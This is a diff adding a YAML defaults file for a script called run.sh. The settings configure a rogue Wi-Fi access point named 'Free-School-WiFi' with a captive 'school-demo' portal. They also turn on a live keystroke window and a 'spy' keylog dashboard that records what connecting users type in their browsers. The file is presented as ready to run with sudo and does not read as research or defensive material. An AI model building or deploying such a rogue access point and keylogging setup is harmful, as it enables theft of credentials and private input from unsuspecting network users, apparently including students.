@@ -1,0 +1,13 @@
+# Defaults used by run.sh prompts (all still selectable at runtime).
+# You never need to edit this — just run: sudo ./run.sh
+ssid: "Free-School-WiFi"
+password: "12345678"   # empty = open network
+channel: 6
+ap_iface: "wlan1"      # suggested; run.sh lists real ifaces
+upstream: "wlan0"      # used only in nat mode (auto-detected if empty)
+mode: "isolated"       # isolated | nat
+portal: "school-demo"  # folder inside my-portals/
+gateway: "192.168.4.1"
+dhcp_range: "192.168.4.10,192.168.4.100,12h"
+live: "on"   # live keystroke window in foot (on | off)
+spy: "on"    # browser keylog dashboard on http://127.0.0.1:8765 (on | off)
